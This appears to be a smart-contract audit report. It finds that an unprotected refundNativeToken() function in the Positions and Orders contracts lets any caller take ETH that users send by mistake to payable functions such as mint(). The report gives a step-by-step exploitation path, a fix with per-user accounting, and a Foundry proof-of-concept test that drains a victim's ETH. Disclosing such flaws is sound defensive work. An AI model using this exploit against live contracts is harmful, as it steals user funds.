## Title
Accidental ETH Sent to Payable Functions Can Be Stolen via Unprotected `refundNativeToken()`

## Summary
The `mint()` function and other payable functions in `BaseNonfungibleToken` and `BasePositions` accept `msg.value` without tracking which user sent how much ETH. The `refundNativeToken()` function in `PayableMulticallable` refunds the entire contract balance to any caller, allowing attackers to steal ETH that users accidentally sent to these contracts.

## Impact
**Severity**: High

## Finding Description

**Location:** 
- [1](#0-0) 
- [2](#0-1) 
- [3](#0-2) 
- [4](#0-3) 

**Intended Logic:** The `mint()` function is marked `payable` to support multicall patterns, but the comment explicitly states "No fees are collected; any msg.value sent is ignored." [5](#0-4)  The `refundNativeToken()` function is designed to refund excess ETH after legitimate operations that require native tokens.

**Actual Logic:** When users accidentally send ETH to `mint()`, `burn()`, or other payable functions that don't require ETH, the funds accumulate in the Positions/Orders contract with no per-user accounting. The `refundNativeToken()` function sends the ENTIRE contract balance to whoever calls it first, regardless of who actually sent the ETH. [4](#0-3) 

**Exploitation Path:**
1. User A calls `mint()` on the Positions contract and accidentally sends 1 ETH (e.g., due to wallet misconfiguration or UI error)
2. The 1 ETH remains in the Positions contract with no record of User A's ownership
3. Attacker monitors the contract balance or mempool and sees ETH accumulating
4. Attacker calls `refundNativeToken()` and receives all 1 ETH that User A sent
5. User A has permanently lost their 1 ETH with no recourse

**Security Property Broken:** Direct theft of user funds - users lose ETH that they accidentally sent to the contract, violating the basic expectation that funds should only be transferred intentionally.

## Impact Explanation

- **Affected Assets**: Native ETH accidentally sent to Positions or Orders contracts via any payable function
- **Damage Severity**: Complete loss of accidentally sent funds. Attackers can steal 100% of accumulated ETH by calling a single function. The attack can be automated via mempool monitoring to steal funds immediately after they're sent.
- **User Impact**: Any user who accidentally includes `msg.value` when calling `mint()`, `burn()`, `deposit()` (for non-ETH pools), `collectFees()`, or `withdraw()` loses their ETH permanently to the first attacker who calls `refundNativeToken()`.

## Likelihood Explanation

- **Attacker Profile**: Any user or MEV bot can exploit this - requires only calling a public function
- **Preconditions**: Users must accidentally send ETH to payable functions. While this requires user error, it's not uncommon due to:
  - Wallet UI bugs or defaults
  - Copy-paste errors in transaction parameters  
  - Confusion about which operations require ETH
  - Legitimate operations with ETH pools that overpay (excess remains in contract)
- **Execution Complexity**: Trivial - single function call with no parameters. Can be automated with mempool monitoring.
- **Frequency**: Exploitable continuously - each time ETH accumulates in the contract, it can be stolen

## Recommendation

Add sender-specific accounting for ETH refunds:

```solidity
// In src/base/PayableMulticallable.sol:

// Add state variable to track per-user ETH deposits
mapping(address => uint256) private ethBalance;

// Modified refundNativeToken function:
function refundNativeToken() external payable {
    uint256 refundAmount = ethBalance[msg.sender];
    if (refundAmount != 0) {
        ethBalance[msg.sender] = 0;
        SafeTransferLib.safeTransferETH(msg.sender, refundAmount);
    }
}

// Add internal function to track ETH received in each payable function
function _trackReceivedETH() internal {
    if (msg.value != 0) {
        ethBalance[msg.sender] += msg.value;
    }
}
```

Then call `_trackReceivedETH()` at the start of each payable function.

**Alternative mitigation:** Remove the `payable` modifier from functions that never legitimately need ETH (like `mint()` and `burn()`), and add explicit validation in functions that do need ETH to ensure the correct amount is sent.

## Proof of Concept

```solidity
// File: test/Exploit_RefundTheft.t.sol
// Run with: forge test --match-test test_RefundTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Positions.sol";
import "../src/Core.sol";

contract Exploit_RefundTheft is Test {
    Positions positions;
    Core core;
    address victim = address(0x1);
    address attacker = address(0x2);
    
    function setUp() public {
        // Deploy Core and Positions contracts
        core = new Core(address(this));
        positions = new Positions(ICore(address(core)), address(this), 0, 0);
        
        // Fund victim and attacker
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);
    }
    
    function test_RefundTheft() public {
        // SETUP: Victim accidentally sends ETH when minting NFT
        vm.prank(victim);
        positions.mint{value: 1 ether}(); // Accidentally includes 1 ETH
        
        // Verify ETH is stuck in Positions contract
        assertEq(address(positions).balance, 1 ether, "ETH stuck in Positions");
        
        // EXPLOIT: Attacker steals the ETH by calling refundNativeToken
        uint256 attackerBalanceBefore = attacker.balance;
        vm.prank(attacker);
        positions.refundNativeToken();
        
        // VERIFY: Attacker stole victim's ETH
        assertEq(attacker.balance, attackerBalanceBefore + 1 ether, "Attacker stole victim's ETH");
        assertEq(address(positions).balance, 0, "Positions contract drained");
        assertEq(victim.balance, 9 ether, "Victim lost 1 ETH permanently");
    }
}
```

## Notes

The original security question's attack vector (front-running to cause high gas prices leading to accidental `msg.value` inclusion) is not technically valid - high gas prices don't cause users to accidentally add value to transactions. However, investigating this question revealed a legitimate vulnerability: the lack of per-user accounting for accidentally sent ETH combined with the permissionless `refundNativeToken()` function creates a direct theft vector.

The issue affects both Positions and Orders contracts, as they both inherit from `BaseNonfungibleToken` and `PayableMulticallable`. [6](#0-5) [7](#0-6)

### Citations

**File:** src/base/BaseNonfungibleToken.sol (L108-108)
```text
    ///      No fees are collected; any msg.value sent is ignored.
```

**File:** src/base/BaseNonfungibleToken.sol (L109-117)
```text
    function mint() public payable returns (uint256 id) {
        bytes32 salt;
        assembly ("memory-safe") {
            mstore(0, prevrandao())
            mstore(32, gas())
            salt := keccak256(0, 64)
        }
        id = mint(salt);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L123-126)
```text
    function mint(bytes32 salt) public payable returns (uint256 id) {
        id = saltToId(msg.sender, salt);
        _mint(msg.sender, id);
    }
```

**File:** src/base/BaseNonfungibleToken.sol (L133-134)
```text
    function burn(uint256 id) external payable authorizedForNft(id) {
        _burn(id);
```

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Positions.sol (L13-13)
```text
contract Positions is BasePositions {
```

**File:** src/Orders.sol (L24-24)
```text
contract Orders is IOrders, UsesCore, PayableMulticallable, BaseLocker, BaseNonfungibleToken {
```
